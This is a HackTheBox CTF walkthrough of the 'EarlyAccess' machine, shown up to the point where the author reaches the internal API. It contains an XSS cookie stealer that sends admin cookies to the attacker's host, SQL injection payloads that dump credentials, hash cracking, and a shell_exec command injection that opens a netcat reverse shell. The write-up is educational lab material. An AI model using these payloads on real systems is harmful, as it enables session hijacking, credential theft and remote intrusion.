---
title: "Walk-through of EarlyAccess from HackTheBox"
header:
  teaser: /assets/images/2022-01-30-21-21-48.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - XSS
  - Python
  - Burp Intruder
  - SQLi
  - JohnTheRipper
  - Feroxbuster
  - wfuzz
  - Docker
---

## Machine Information

![earlyaccess](/assets/images/2022-01-30-21-21-48.png)

EarlyAccess is a rated as a hard machine on HackTheBox. This was a long and complex box themed around an imaginary game development company. We start by registering to access a forum and find that there is an XSS vulnerability. Eventually we find a way to capture the admins session token and use it to gain access to the portal as them. This lets us download a key generator, and after deciphering how it works we generate a list of potentials and use Burp Intruder to brute force. With a valid key we can log in to a new area and there we find an SQLi vulnerability that we use to dump database credentials. This gives us a hash that we crack to gain access to a third area of the site. Here we use parameter tampering to retrieve files, leading to the discovery of a debug function that lets us finally get a reverse shell. Once inside we navigate around containers to find a tic-tac-toe game that we ultimately crash to gain root.

<!--more-->

Skills required are knowledge of XXS and SQLi techniques. Being able to understand Python is also required. Skills learned are deeper knowledge of Python and Javascript, using Burp Intruder, researching and utilising exploitation techniques,

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Hard - EarlyAccess](https://www.hackthebox.com/home/machines/profile/375) |
| Machine Release Date | 4th September 2021 |
| Date I Completed It | 3rd February 2022 |
| Distribution Used | Kali 2021.4 – [Release Info](https://www.kali.org/blog/kali-linux-2021-4-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/earlyaccess]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.110 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root💀kali)-[~/htb/earlyaccess]
└─# nmap -p$ports -sC -sV -oA earlyaccess 10.10.11.110
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-30 21:18 GMT
Nmap scan report for 10.10.11.110
Host is up (0.024s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
80/tcp  open  http     Apache httpd 2.4.38
|_http-title: Did not follow redirect to https://earlyaccess.htb/
|_http-server-header: Apache/2.4.38 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
|_http-title: EarlyAccess
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Not valid before: 2021-08-18T14:46:57
|_Not valid after:  2022-08-18T14:46:57
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.38 (Debian)
|_ssl-date: TLS randomness does not represent time
Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 18.39 seconds
```

We can see the common name for the site from the ssl certificate. Let's add that to our hosts file:

```sh
┌──(root💀kali)-[~/htb/meta]
└─# echo "10.10.11.110 earlyaccess.htb" >> /etc/hosts
```

## Mamba Website

We can browse the site, which does look nice:

![earlyaccess-443](/assets/images/2022-01-30-21-25-38.png)

But there is no content, so let's register an account here:

![earlyaccess-register](/assets/images/2022-01-30-21-32-21.png)

We end at the dashboard here:

![earlyaccess-dashboard](/assets/images/2022-01-30-21-34-10.png)

Looking around I found this post on the Forum:

![earlyaccess-forum](/assets/images/2022-01-30-22-34-54.png)

A definite clue that we have SQLi somewhere. On the Messaging area clicking on Contact Us lets you send a message to admin:

![earlyaccess-message](/assets/images/2022-01-30-22-18-24.png)

When it's sent you get this message:

![earlyaccess-sent](/assets/images/2022-01-30-22-37-51.png)

Another clue, this one suggesting there's a script running to read the messages sent.

## XSS Exploit

It took me way too long to figure out what to do next! The first clue was that the username is vulnerable, it turns out you can do XSS with it. So first of all I found [this](https://stackoverflow.com/questions/247483/http-get-request-in-javascript):

```js
function httpGet(theUrl)
{
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open("GET", theUrl, false);
        xmlHttp.send(null);
        return xmlHttp.responseText;
}
httpGet("https://10.10.14.11:4443/"+document.cookie);
```

I've saved that to a file on Kali called pencer.js, then start a webserver there so the box can get to it.

Now we need to call it by using XSS in my username on the profile page:

![pencer-profile](/assets/images/2022-01-30-22-41-30.png)

Here I've just added a simple XSS call back to my Kali IP to get the pencer.js file:

```html
<script src="https://10.10.14.11:4443/pencer.js" />
```

However it didn't work:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# python3 -m http.server 4443
Serving HTTP on 0.0.0.0 port 4443 (http://0.0.0.0:4443/) ...
10.10.11.110 - - [30/Jan/2022 22:19:17] code 400, message Bad request version ('o\x9c)É«·\x00')
o)É«· " 400 -F®j=[Ê0/Jan/2022 22:19:17] "ü¸Ù=¹Ä½3Å▒µÐ÷0+p¹@ÊØ·3]Ñ£ 
10.10.11.110 - - [30/Jan/2022 22:19:17] code 400, message Bad request version ('éF\x05@\x92´\x1a\
'%¥\x00"êê\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x00')
10.10.11.110 - - [30/Jan/2022 22:19:17] "üZ(ÜW^ÿâF05O¼$µlf¨Ð¦r{Hoe²f» _k(êtoG"\/8ªlSMÀ¿k        
éF@´▒'%¥"êêÀ+À/À,À0Ì©Ì¨ÀÀ/5" 400 -
```

So I tried a PHP server which gave me more information:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# php -S 0.0.0.0:4443
[Sun Jan 30 21:58:19 2022] PHP 7.4.26 Development Server (http://0.0.0.0:4443) started
[Sun Jan 30 22:08:17 2022] 10.10.11.110:41902 Accepted
[Sun Jan 30 22:08:17 2022] 10.10.11.110:41902 Invalid request (Unsupported SSL request)
[Sun Jan 30 22:08:17 2022] 10.10.11.110:41902 Closing
```

## Python HTTPS Server

I forgot the site is HTTPS so my server on Kali needs to be capable of that as well. I searched for a python https server and found [this](https://stackoverflow.com/questions/19705785/python-3-simple-https-server), I just changed the server address, and the pem file name:

```python
import http.server, ssl
server_address = ('0.0.0.0', 4443)
httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='pencer.pem', ssl_version=ssl.PROTOCOL_TLS)
httpd.serve_forever()
```

To create the pem file to use with my Python HTTPS server I used [this](https://github.com/3gstudent/pyXSSPlatform) to show me the correct opennssl command:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# openssl req -new -x509 -keyout pencer.pem -out pencer.pem -days 3650 -nodes
Generating a RSA private key
.......+++++
............................................+++++
writing new private key to 'pencer.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Now start the Python HTTPS server:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# python3 https-server.py
```

Then switch back to the box and send another message just like before:

![earlyaccess-message](/assets/images/2022-01-30-22-18-24.png)

## Admin Cookie Stealer

Wait a few minutes and if all goes to plan we see the box make contact, our cookie stealing JavaScript file is pulled back to the box and it returns the admin user cookie to us:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# python3 https-server.py
10.10.11.110 - - [30/Jan/2022 22:11:16] "GET /cookies.js HTTP/1.1" 200 -
10.10.11.110 - - [30/Jan/2022 22:11:26] code 404, message File not found
10.10.11.110 - - [30/Jan/2022 22:11:26] "GET /XSRF-TOKEN=eyJpdiI6IllUeTdhNWk5eDVCK
FkNmI0MDQ5ZjI<SNIP>xMzBjMWQ2NzNlNjVjNjhlMWMyMTI4NmFkMmVkMWZiIn0%3D;%20
earlyaccess_session=eyJpdiI6IjV3Ly9ZTE5VQk5ERm<SNIP>hOTkVUbXZJQnc9PSIsInZhbHVlIjoia3J
ThlYTI0YTk2MmE4MDIzZDNjNWNiZWYxNGM2OGU3NzlmODdhZTMzNjY2NjI5YzA2In0%3D HTTP/1.1" 404 -
```

Notice there are two cookies returned, XRSF-TOKEN and earlyaccess_session, we need the second one which I cut out like this:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# echo "XSRF-TOKEN=eyJpdiI6IllUeTdhNWk5eDVCKFkNmI0MDQ5ZjI<SNIP>xMzBjMWQ2NzN
lNjVjNjhlMWMyMTI4NmFkMmVkMWZiIn0%3D;%20earlyaccess_session=eyJpdiI6IjV3Ly9ZT
E5VQk5ERm<SNIP>hOTkVUbXZJQnc9PSIsInZhbHVlIjoia3JThlYTI0YTk2MmE4MDIzZDNjNWNiZ
WYxNGM2OGU3NzlmODdhZTMzNjY2NjI5YzA2In0%3D | cut -d \; -f 2 | cut -d = -f 2

eyJpdiI6IjV3Ly9ZTE5VQk5ERm<SNIP>hOTkVUbXZJQnc9PSIsInZhbHVlIjoia3JThlYTI0YT
k2MmE4MDIzZDNjNWNiZWYxNGM2OGU3NzlmODdhZTMzNjY2NjI5YzA2In0%3D
```

Just copy the text after the two cuts and paste it in to the browser using Cookie Editor or similar:

![earlyaccess-cookie](/assets/images/2022-01-30-23-07-48.png)

## Admin Access

Save that cookie and refresh to be logged in to the dashboard as admin:

![earlyaccess-admin](/assets/images/2022-01-30-23-09-01.png)

Menu shows us two new subdomains, add them to hosts file:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# sed -i '/10.10.11.110 earlyaccess.htb/ s/$/ dev.earlyaccess.htb game.earlyaccess.htb/' /etc/hosts
```

For now the Dev and Game sub-sites are a dead end as they lead to log in pages. The Admin section has only two parts that work. The Download backup one:

![earlyaccess-backup](/assets/images/2022-01-31-21-51-37.png)

## Key Validator Script

Here we need to download the backup of the Key-Validator, so get that now.

This Verify a game-key section is where we will be entering the key we create using the backup we've just downloaded:

![earlyaccess-admin-panel](/assets/images/2022-01-31-21-50-19.png)

Switch to the terminal and unzip the backup:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# unzip backup.zip
Archive:  backup.zip
  inflating: validate.py
```

Running the Python script we get this:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# python3 validate.py
        # Game-Key validator #
        Can be used to quickly verify a user's game key, when the API is down (again).
        Keys look like the following:
        AAAAA-BBBBB-CCCC1-DDDDD-1234
        Usage: validate.py <game-key>
```

The script isn't that long but it's hard to follow if you don't understand Python. There is basically five parts to it, each one creates a section of the key which we see in the example above. I used [this](https://www.programiz.com/python-programming/online-compiler) online Python compiler to play with each section and figure out what it does.

Let's look at them in turn, first part one which we can see is five characters long. The section of the script that validates our input is here:

```python
def g1_valid(self) -> bool:
    g1 = self.key.split('-')[0]
    r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
    if r != [221, 81, 145]:
        return False
    for v in g1[3:]:
        try:
            int(v)
        except:
            return False
    return len(set(g1)) == len(g1)
```

This takes the digits before the first dash and performs [modulo](https://pythonguides.com/percent-sign-mean-in-python) and [ordinal](https://www.askpython.com/python/built-in-methods/python-chr-and-ord-methods) sums on the first three characters to check they are equal to the decimal values of 221, 81 and 145. It then checks characters four and five are integers, these can be any digits.

Changing the above so we can test each character of the alphabet against the sum gives us this:

```python
import string
g1_numbers=[221, 81, 145]
g1_results=""
i=0
for a in g1_numbers:
    for b in [c for c in string.ascii_uppercase+string.digits]:
        if (ord(b)<<i+1)%256^ord(b) == a:
            g1_results+=b
    i+=1
g1_results+="10"
print (g1_results)
```

Our key looks like this KEY10 for group one. On to the next, from the script we have this:

```python
    def g2_valid(self) -> bool:
        g2 = self.key.split('-')[1]
        p1 = g2[::2]
        p2 = g2[1::2]
        return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
```

This one is just checking p1 is equal to p2 using the [double colon](https://blog.finxter.com/python-double-colon/) function to take elements from the five characters passed to it. Then it [encodes](https://www.programiz.com/python-programming/methods/string/encode) the strings value and converts to a [bytearray](https://www.geeksforgeeks.org/python-bytearray-function).

Like before I took the code, changed it around so I could test values:

```python
g2 = "0A0O0"
p1 = g2[::2]
p2 = g2[1::2]
print (sum(bytearray(p1.encode())))
print (sum(bytearray(p2.encode())))
```

I just played around with values for g2 and found 0A0O0 gives an output of 144 and 144 which satisfies the check, so I know 0A0O0 is valid.

Our key now looks like this KEY10-0A0O0.

Group three next, the script looks like this:

```python
    def g3_valid(self) -> bool:
        # TODO: Add mechanism to sync magic_num with API
        g3 = self.key.split('-')[2]
        if g3[0:2] == self.magic_value:
            return sum(bytearray(g3.encode())) == self.magic_num
        else:
            return False
```

We also need to look at the start of the script to understand what the magic_value and magic_num are:

```python
    magic_value = "XP" # Static (same on API)
    magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)
```

From this we know the first two characters need to be XP. The script also tells us the next two characters are alpha and the last character is numeric. Finally we know that these remaining three characters combined with XP are encoded, then converted to a bytearray, then summed. This needs to equal the magic number, which we see will change every 30 minutes. This means we need to calculate all possible values and then try each in turn on the site to see which one is valid at that point.

If we assume AA0 is the first possible combination of those last three characters then we know the magic number is a minimum of 178, we can check:

```python
magic_value="AA0"
print (sum(bytearray(magic_value.encode())))
```

Now we just need to do three loops to try each possible combination and return any that are greater than our magic number:

```python
import string
magic_num=178
for a in [x for x in string.ascii_uppercase]:
    for b in [x for x in string.ascii_uppercase]:  
        for c in [x for x in string.digits]:
            last_3_chars=a+b+str(c)
            if sum(bytearray(last_3_chars.encode())) > magic_num:
                g3="XP"+last_3_chars+"-"
                magic_num+=1
                print (g3)
```

Group four next. Here is the script:

```python
    def g4_valid(self) -> bool:
        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]
```

This one is a bit easier. It's just taking the value we've found for the first group and making a tuple with the value of the fourth group using the Python [zip](https://realpython.com/python-zip-function/) function. Then it's doing an [XOR](https://www.kite.com/python/answers/how-to-take-the-bitwise-xor-of-two-strings-in-python) on the ordinals for both and checking if the result is the same as the five given numbers of 12, 4 ,20, 117 and 0.

 We can change this around to find what that fourth group would be:

```python
import string
g1_result="KEY10"
g4_values = [12, 4, 20, 117, 0]
g4_result=""
test_values = [a for a in string.ascii_uppercase+string.digits]
i=0
for b in g1_result:
    for c in test_values:
        if ord(b) ^ ord(c) == g4_values[i]:
            g4_result+=c
            i+=1
            break
print (g4_result)
```

From this we find group four is GAMD0.

Our key looks like this KEY99-0A0O0-XPAA0-GAMD0.

On to Group five which is handled by two different parts of the script:

```python
def calc_cs(self) -> int:
    gs = self.key.split('-')[:-1]
    return sum([sum(bytearray(g.encode())) for g in gs])

def cs_valid(self) -> bool:
    cs = int(self.key.split('-')[-1])
    return self.calc_cs() == cs
```

I guess cs is for checksum as this one is just checking the other four groups are valid. We will get a value from calc_cs based on the four parts to the key after it's been encoded, converted to bytearray and summed. That's compared with the same four parts of the key converted to an integer.

We can see what that value would be for our first possible key:

```python
gs="KEY10-0A0O0-XPAA0-GAMD0-0000"
cs = (gs.split('-')[:-1])
checksum = sum([sum(bytearray(g.encode())) for g in cs])
print (str(checksum))
```

Now we know how each part of the key is generated we can put the above together and create a script that gives us a list of all possible keys. It's actually only 59 keys so less to test than I first thought.

With three of the five groups static we can simplify the script to just calculate the list of 59 variations:

```python
import string
magic_num=178
for a in [x for x in string.ascii_uppercase]:
    for b in [x for x in string.ascii_uppercase]:  
        for c in [x for x in string.digits]:
            last_3_chars=a+b+str(c)
            if sum(bytearray(last_3_chars.encode())) > magic_num:
                g3="XP"+last_3_chars
                magic_num+=1
                cs = ["KEY10", "0A0O0", g3, "GAMD0"]
                checksum = sum([sum(bytearray(g.encode())) for g in cs])
                print ("KEY10-0A0O0-"+g3+"-GAMD0-"+(str(checksum)))
```

## Verify Game-Key

Save that to a file on Kali and then run it:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# python3 keygen.py
KEY10-0A0O0-XPAA1-GAMD0-1294
KEY10-0A0O0-XPAA2-GAMD0-1295
KEY10-0A0O0-XPAA3-GAMD0-1296
KEY10-0A0O0-XPAA4-GAMD0-1297
KEY10-0A0O0-XPAA5-GAMD0-1298
KEY10-0A0O0-XPAA6-GAMD0-1299
<SNIP>
```

With our list ready now go back to the Verify Game-Key area of the website, which we access as admin. Before entering a key to verify start Burp and set it listening, also remember to set your browser to use Burp as its proxy. Now paste anything in to the enter game-key field and click Verify key:

![earlyaccess-admin-panel](/assets/images/2022-01-31-21-50-19.png)

## Burp Intruder

Switch to Burp to see the captured request, forward it to Intruder. On the Positions tab change key to fuzz, highlight it then click Add on the right:

![earlyaccess-burp-intruder](/assets/images/2022-01-31-22-48-51.png)

Now switch to the Payloads tab and paste in our list of keys:

![earlyaccess-burp-payload](/assets/images/2022-01-31-22-49-36.png)

Finally go to the Options tab and change Redirections to Always:

![earlyaccess-bury-options](/assets/images/2022-01-31-22-50-39.png)

Now start the attack and watch the Results:

![earlyaccess-burp-key-found](/assets/images/2022-01-31-22-51-39.png)

We're looking for the one request that returned a length of 14190, all the rest are 14161. Look at the bottom window to see the key that was used. We know from the response that this was successful.

Copy and paste it in to the verify game-key box, this time you should get a Success:

![earlyaccess-valid-key](/assets/images/2022-01-31-22-48-06.png)

## Register Game-Key

Now logout as admin and back in as our user, go to the Register Key section and paste our valid key in:

![earlyaccess-register-key-](/assets/images/2022-01-31-22-58-32.png)

We can now log in to the game section:

![earlyaccess-game-login](/assets/images/2022-02-03-21-48-11.png)

## Snake

Have a go at the game if you want to:

![earlyaccess-play-game](/assets/images/2022-02-03-21-50-46.png)

The scoreboard shows how bad I did:

![earlyacces-scoreboard](/assets/images/2022-02-03-21-52-06.png)

## SQLi Exploitation

There's not a lot else to do here, but thinking back to the forum post we saw at the start it said the user SingleQuoteMan had a problem with his name on the scoreboard. This is a clue that we can use SQLi to retrieve data. Switch back to our user profile and change the name:

![earlyaccess-sqli-profile](/assets/images/2022-02-03-22-04-57.png)

Now back to the scoreboard and refresh:

![earlyaccess-sqli-scoreboard](/assets/images/2022-02-03-22-05-38.png)

This tells us the scoreboard is vulnerable but we didn't get the syntax quite right. I covered SQLi in depth for [this](https://pencer.io/ctf/ctf-thm-sqhell) TryHackMe room. Using the same process I changed my username to:

```text
pencer') union select table_name,null,null from information_schema.tables -- -
```

Which let me see all the tables in the database:

![earlyaccess-sqli-tables](/assets/images/2022-02-03-22-16-03.png)

Next I dumped the users and passwords by changing my username to this:

```text
pencer') union select name,password,null from users -- -
```

Which gave me them all:

![earlyaccess-sqli-uers](/assets/images/2022-02-03-22-18-13.png)

## JohnTheRipper

Let's take the admin hash and crack it:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# echo "618292e936625aca8df61d5fff5c06837c49e491" > hash

┌──(root💀kali)-[~/htb/earlyaccess]
└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>         (?)     
1g 0:00:00:00 DONE (2022-02-03 22:22) 100.0g/s 658400p/s 658400c/s 658400C/s july12..foolish
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```

With the credentials we can now log in to the dev site:

![earlyaccess-dev-login](/assets/images/2022-02-03-22-26-08.png)

Not a lot on the dev site, we have this page with hashing tools:

![earlyaccess-dev-hashing](/assets/images/2022-02-03-22-30-57.png)

And this one for file tools:

![earlyaccess-dev-file](/assets/images/2022-02-03-22-31-45.png)

## Feroxbuster

User Feroxbuster to look for subfolders:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# feroxbuster --url http://dev.earlyaccess.htb
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.earlyaccess.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301        9l       28w      329c http://dev.earlyaccess.htb/includes
301        9l       28w      327c http://dev.earlyaccess.htb/assets
301        9l       28w      328c http://dev.earlyaccess.htb/actions
301        9l       28w      331c http://dev.earlyaccess.htb/assets/css
301        9l       28w      330c http://dev.earlyaccess.htb/assets/js
403        9l       28w      284c http://dev.earlyaccess.htb/server-status
301        9l       28w      337c http://dev.earlyaccess.htb/assets/css/fonts
[####################] - 1m    209993/209993  0s      found:7       errors:675    
```

Actions sounds interesting, let's search that:

```sh
┌──(root💀kali)-[/usr/share/wordlists]
└─# feroxbuster --url http://dev.earlyaccess.htb/actions/ -x php
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.earlyaccess.htb/actions/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302        0l        0w        0c http://dev.earlyaccess.htb/actions/logout.php
302        0l        0w        0c http://dev.earlyaccess.htb/actions/login.php
500        1l        3w       35c http://dev.earlyaccess.htb/actions/file.php
302        0l        0w        0c http://dev.earlyaccess.htb/actions/hash.php
[####################] - 30s    59998/59998   0s      found:4       errors:0      
```

## Fuzzing Parameters

Fuzzing found a parameter:

```sh
┌──(root💀kali)-[/usr/share/seclists]
└─# wfuzz --hw 3 -w Discovery/Web-Content/raft-large-words-lowercase.txt http://dev.earlyaccess.htb/actions/file.php?FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://dev.earlyaccess.htb/actions/file.php?FUZZ
Total requests: 50
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000050:   500        0 L      2 W        32 Ch       "filepath"
```

## Data Exfiltration

Try to get to a known file:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# curl http://dev.earlyaccess.htb/actions/file.php?filepath=/etc/passwd
<h1>ERROR:</h1>For security reasons, reading outside the current directory is prohibited!
```

Try to read file.php:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# curl http://dev.earlyaccess.htb/actions/file.php?filepath=file.php   
<h2>Executing file:</h2><p>file.php</p><br><h2>Executed file successfully!
```

Try to read hash.php:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# curl http://dev.earlyaccess.htb/actions/file.php?filepath=hash.php
<h2>Executing file:</h2><p>hash.php</p><br><br />
<b>Warning</b>:  Cannot modify header information - headers already sent by 
(output started at /var/www/earlyaccess.htb/dev/actions/file.php:18) in 
<b>/var/www/earlyaccess.htb/dev/actions/hash.php</b> on line <b>77</b>
<br /><h2>Executed file successfully!
```

This gives us a file path. Just like we did on [Timing](https://www.hackthebox.com/home/machines/profile/421) we can base64 encode the file to retrieve it:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# curl http://dev.earlyaccess.htb/actions/file.php?filepath=php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php
<h2>Executing file:</h2>
<p>php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php</p>
<br>PD9waHAKaW5jbHVkZV9vbmNlICIuLi9pbmNsdWRlcy9zZXNzaW9uLnBocCI7CgpmdW5jdGlvbiBoYXNoX3B3KCRoYXN
oX2Z1bmN0aW9uLCAkcGFiAgICBvYl9lbmRfY2xlYW4oKTsKICAgIHJldHVybiAkaGFzaDsKfQoKdHJ5CnsKICAgIGlmKGlz
<SNIP>
```

Decode the base64:

```sh
──(root💀kali)-[~/htb/earlyaccess]
└─# echo "PD9waHAKaW5jbHVkZ9zZXNzaW9uLnB<SNIP>ICByZXR1cm47Cn0KPz4=" | base64 -d
```

## Hash File Code Review

Now we have the hash.php file to look at. The interesting part is this function:

```php
function hash_pw($hash_function, $password)
{
    // DEVELOPER-NOTE: There has gotta be an easier way...
    ob_start();
    // Use inputted hash_function to hash password
    $hash = @$hash_function($password);
    ob_end_clean();
    return $hash;
}
```

We can provide the password and the function used to hash it. Then further down in the script:

```php
if(isset($_REQUEST['hash_function']) && isset($_REQUEST['hash']) && isset($_REQUEST['password']))
{
    // Only allow custom hashes, if `debug` is set
      if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
        throw new Exception("Only MD5 and SHA1 are currently supported!");
        {
                $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);

                $_SESSION['verify'] = ($hash === $_REQUEST['hash']);
                header('Location: /home.php?tool=hashing');
                return;
            }
        }
```

## Debug Exploit

If we modify the request and send a parameter with debug=true, then we can execute our own commands using shell_exec as the hash function. Let's try to list the directory:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# curl -s -L -k -X POST -b 'PHPSESSID=7241f80366715e8f4308d92c6837234d' --data-binary 'action=hash&redirect=true&password=ls&hash_function=shell_exec&debug=true' 'http://dev.earlyaccess.htb/actions/hash.php' | grep "Hashed password" -A 5 
<h3>Hashed password:</h3>
file.php
hash.php
login.php
logout.php
```

Time for a reverse shell:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# curl -s -L -k -X POST -b 'PHPSESSID=7241f80366715e8f4308d92c6837234d' --data-binary 'action=hash&redirect=true&password=nc+10.10.14.12+1337+-e+/bin/bash&hash_function=shell_exec&debug=true' $'http://dev.earlyaccess.htb/actions/hash.php'
```

## User Shell

Switch to a waiting netcat listener to see we are connected:

```sh
┌──(root💀kali)-[~/htb/earlyaccess]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.110] 46424
```

Upgrade the shell to something more useable:

```text
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z
zsh: suspended  nc -nlvp 1337
┌──(root💀kali)-[~/htb/earlyaccess]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 1337
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ export TERM=xterm
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ stty rows 60 cols 236
```

We're connected as www-data, but looking in the home folder we see another user. Lucky for us they have reused the admin password we cracked earlier:

```text
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ls -lsa /home
4 drwxr-xr-x 2 www-adm www-adm 4096 Feb  3 15:50 www-adm

www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ su www-adm
Password: 
www-adm@webserver:/var/www/earlyaccess.htb/dev/actions$
```

Looking in our home folder there is no user flag, but the contents of the .wgetrc file is interesting:

```text
www-adm@webserver:/var/www/earlyaccess.htb/dev/actions$ cd /home/www-adm/
www-adm@webserver:~$ ls -lsa
0 lrwxrwxrwx 1 root    root       9 Feb  3 15:50 .bash_history -> /dev/null
4 -rw-r--r-- 1 www-adm www-adm  220 Apr 18  2019 .bash_logout
4 -rw-r--r-- 1 www-adm www-adm 3526 Apr 18  2019 .bashrc
4 -rw-r--r-- 1 www-adm www-adm  807 Apr 18  2019 .profile
4 -r-------- 1 www-adm www-adm   33 Feb  3 15:50 .wgetrc

www-adm@webserver:~$ cat .wgetrc 
user=api
password=<HIDDEN>
```

Looking around I eventually grepped for that api user and found this:

```text
www-adm@webserver:/var/www/html/app$ grep -ir api
Models/API.php:class API extends Model
Models/API.php:     * Verifies a game-key using the API
Models/API.php:     * @return string //Returns response from API
Models/API.php:            $response = Http::get('http://api:5000/verify/' . $key);
```

The API.php file has a URL, we can use wget to look at it:

```text
www-adm@webserver:/var/www/html/app$ wget http://api:5000
--2022-02-04 16:53:38--  http://api:5000/
Resolving api (api)... 172.18.0.101
Connecting to api (api)|172.18.0.101|:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 254 [application/json]
index.html: Permission denied
```

Permissions denied to index.html. I need to be in my home folder so wget uses the config file:

